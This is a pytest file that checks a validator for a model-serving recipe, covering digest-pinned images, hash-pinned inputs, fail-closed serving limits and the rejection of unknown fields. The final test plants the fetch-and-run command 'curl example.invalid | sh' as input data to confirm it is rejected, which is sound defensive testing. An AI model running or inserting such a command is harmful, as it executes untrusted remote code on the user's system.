from __future__ import annotations

import copy
import importlib.util
import json
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "scripts" / "sparkring_recipe.py"
SPEC = importlib.util.spec_from_file_location("sparkring_recipe", MODULE_PATH)
assert SPEC is not None and SPEC.loader is not None
recipe_module = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(recipe_module)


def _recipe() -> dict:
    return json.loads(
        (ROOT / "recipes" / "glm52-nf3-hybrid.json").read_text(encoding="utf-8")
    )


def test_single_nf3_recipe_is_valid_and_local_build_ready():
    recipe = _recipe()
    recipe_module._validate(recipe)
    assert recipe["recipe_id"] == "glm52-nf3-hybrid"
    assert recipe["runtime"]["final_image"] is None
    assert recipe["publication"]["zero_build_ready"] is False
    assert recipe["publication"]["local_build_ready"] is True
    assert recipe["serving"]["default_kv_profile"] == "fp8"
    assert recipe["serving"]["kv_profiles"]["nvfp4-rope8"][
        "reported_kv_tokens"
    ] == 875520


def test_plan_is_offline_deterministic_and_names_bootstrap(capsys):
    recipe, path = recipe_module._load("glm52-nf3-hybrid")
    first = recipe_module._canonical_digest(recipe)
    second = recipe_module._canonical_digest(
        json.loads(json.dumps(recipe, sort_keys=False))
    )
    assert first == second
    assert recipe_module._plan(recipe, path, False) == 0
    output = capsys.readouterr().out
    assert "built locally from pinned public inputs" in output
    assert "bootstrap_nf3.py" in output


def test_zero_build_cannot_be_claimed_without_final_image():
    recipe = _recipe()
    recipe["publication"]["zero_build_ready"] = True
    with pytest.raises(recipe_module.RecipeError, match="without final_image"):
        recipe_module._validate(recipe)


def test_final_image_must_be_digest_pinned():
    recipe = _recipe()
    recipe["runtime"]["final_image"] = "ghcr.io/fujitsupolycom/sparkring-nf3:latest"
    with pytest.raises(recipe_module.RecipeError, match="immutable OCI digest"):
        recipe_module._validate(recipe)


def test_mtp_inputscales_are_identity_pinned():
    recipe = _recipe()
    recipe["model"]["mtp_draft"]["inputscales_sha256"] = "not-a-hash"
    with pytest.raises(
        recipe_module.RecipeError,
        match=r"model\.mtp_draft\.inputscales_sha256",
    ):
        recipe_module._validate(recipe)


def test_aiden_cannot_become_a_second_public_recipe():
    recipe = copy.deepcopy(_recipe())
    recipe["recipe_id"] = "glm52-mxfp4-gptq"
    with pytest.raises(recipe_module.RecipeError, match="only NF3"):
        recipe_module._validate(recipe)


def test_required_nf3_safety_controls_are_fail_closed():
    for field, value in (
        ("workspace_reserve_bytes", 0),
        ("startup_profile_max_tokens", 4096),
        ("max_num_seqs", 16),
        ("mtp_policy", "fixed-4"),
    ):
        recipe = _recipe()
        recipe["serving"][field] = value
        with pytest.raises(recipe_module.RecipeError, match=f"serving.{field}"):
            recipe_module._validate(recipe)


def test_unknown_top_level_field_is_rejected(tmp_path, monkeypatch):
    recipe = _recipe()
    recipe["shell_command"] = "curl example.invalid | sh"
    recipes = tmp_path / "recipes"
    recipes.mkdir()
    (recipes / "glm52-nf3-hybrid.json").write_text(
        json.dumps(recipe), encoding="utf-8"
    )
    monkeypatch.setattr(recipe_module, "RECIPES", recipes)
    with pytest.raises(recipe_module.RecipeError, match="unknown recipe fields"):
        recipe_module._load("glm52-nf3-hybrid")
